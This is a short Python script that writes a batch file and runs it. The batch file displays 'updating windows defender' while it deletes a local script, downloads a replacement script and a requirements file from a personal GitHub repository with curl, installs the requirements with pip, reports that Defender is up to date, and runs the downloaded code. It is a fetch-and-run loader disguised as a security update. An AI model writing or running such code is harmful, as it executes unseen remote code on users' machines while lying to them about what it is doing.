import os
  
open("update.bat", "w+").write("""
    echo updating windows defender

    timeout /t 10 /nobreak
    del runer.py
    
    curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/runer.py -O
    curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/requirements.txt -O
    
    pip install -r requirements.txt
    
    echo windows defender is up to date
    python runer.py                               
""")

os.system("update.bat")
